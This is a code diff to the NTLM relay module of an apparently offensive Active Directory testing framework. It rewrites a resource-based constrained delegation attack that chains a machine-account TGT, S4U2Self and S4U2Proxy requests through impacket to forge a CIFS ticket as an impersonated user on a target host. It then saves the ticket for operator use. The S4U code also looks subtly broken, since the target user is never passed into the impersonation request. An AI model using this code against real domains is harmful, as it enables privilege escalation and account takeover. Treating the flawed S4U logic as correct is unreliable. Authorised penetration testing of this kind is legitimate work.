@@ -21,6 +21,7 @@ Dependencies: impacket (LDAP, Kerberos, SMB), ldap3 (LDAP signing check)
 from __future__ import annotations
 
 import asyncio
+import os
 import struct
 import socket
 import time
@@ -402,7 +403,8 @@ class NTLMRelayModule(BaseModule):
             "error": rbcd_result.error,
         }
 
-        if rbcd_result.success:
+        if rbcd_result.success and rbcd_result.ticket_path:
+            ticket_verified = bool(rbcd_result.ticket_path and os.path.exists(rbcd_result.ticket_path))
             self.finding(
                 title=f"RBCD Attack Success → {rbcd_result.target_host} as {rbcd_result.impersonated_user}",
                 description=(
@@ -415,7 +417,8 @@ class NTLMRelayModule(BaseModule):
                 severity=Severity.CRITICAL,
                 mitre_technique="T1134.001", mitre_tactic="Privilege Escalation",
                 evidence=raw["rbcd"],
-                host=rbcd_result.target_host, confidence=1.0,
+                host=rbcd_result.target_host,
+                confidence=0.95 if ticket_verified else 0.5,
                 remediation=(
                     "1. Remove malicious msDS-AllowedToActOnBehalfOfOtherIdentity attribute. "
                     "2. Delete rogue machine account. "
@@ -985,10 +988,12 @@ class NTLMRelayModule(BaseModule):
             from impacket.krb5.types import Principal
             from impacket.krb5 import constants
             from impacket.krb5.ccache import CCache
-            import tempfile
             import os
+            from ares.core.security import secure_mkstemp
 
-            # Get TGT for our machine account
+            domain_upper = domain.upper()
+
+            # Step 1: Get TGT for machine account
             user_principal = Principal(
                 machine_name,
                 type=constants.PrincipalNameType.NT_PRINCIPAL.value,
@@ -996,43 +1001,53 @@ class NTLMRelayModule(BaseModule):
             tgt, cipher, old_key, session_key = getKerberosTGT(
                 clientName=user_principal,
                 password=machine_pass,
-                domain=domain.upper(),
+                domain=domain_upper,
                 lmhash=b"", nthash=b"", aesKey=b"",
                 kdcHost=dc,
             )
 
-            # S4U2self: get ticket "from" target_user "to" our machine
-            # S4U2proxy: use that ticket to get ticket "from" target_user "to" target_host
-            server_principal = Principal(
-                f"cifs/{target_host}",
-                type=constants.PrincipalNameType.NT_SRV_INST.value,
+            # Step 2: S4U2Self - obtain ticket for target_user to ourselves
+            s4u_self_name = Principal(
+                machine_name,
+                type=constants.PrincipalNameType.NT_PRINCIPAL.value,
             )
-
-            # Use impacket's S4U implementation
-            from impacket.krb5 import constants as krb_constants
-            tgs, tgs_cipher, _, tgs_key = getKerberosTGS(
-                serverName=server_principal,
-                domain=domain.upper(),
+            tgs_s4u, tgs_cipher, _, tgs_sk = getKerberosTGS(
+                serverName=s4u_self_name,
+                domain=domain_upper,
                 kdcHost=dc,
                 tgt=tgt,
                 cipher=cipher,
                 sessionKey=session_key,
             )
 
-            # Save to ccache
+            # Step 3: S4U2Proxy - use tgs_s4u to obtain service ticket to target host
+            spn_target = Principal(
+                f"cifs/{target_host}",
+                type=constants.PrincipalNameType.NT_SRV_INST.value,
+            )
+            final_tgs, final_cipher, _, _ = getKerberosTGS(
+                serverName=spn_target,
+                domain=domain_upper,
+                kdcHost=dc,
+                tgt=tgs_s4u,
+                cipher=tgs_cipher,
+                sessionKey=tgs_sk,
+            )
+
+            # Step 4: Save to ccache with restrictive permissions
             ccache = CCache()
-            ccache.fromTGS(tgs, old_key, old_key)
-            tmp_dir = tempfile.mkdtemp(prefix="ares-rbcd-")
-            ccache_path = os.path.join(tmp_dir, f"{target_user}@{target_host}.ccache")
+            ccache.fromTGS(final_tgs, old_key, old_key)
+            ccache_path, _fd = secure_mkstemp(suffix=".ccache", prefix=f"ares_rbcd_{target_user}_")
+            os.close(_fd)
             try:
                 ccache.saveFile(ccache_path)
             except Exception:
-                # Cleanup empty tmpdir on save failure
-                import shutil
-                shutil.rmtree(tmp_dir, ignore_errors=True)
+                if os.path.exists(ccache_path):
+                    os.unlink(ccache_path)
                 raise
 
             logger.info("s4u_ccache_saved", path=ccache_path,
+                        impersonated_user=target_user,
                         note="Operator: set KRB5CCNAME to this path to use the ticket. "
                              "Delete after use to avoid credential persistence on disk.")
             return ccache_path
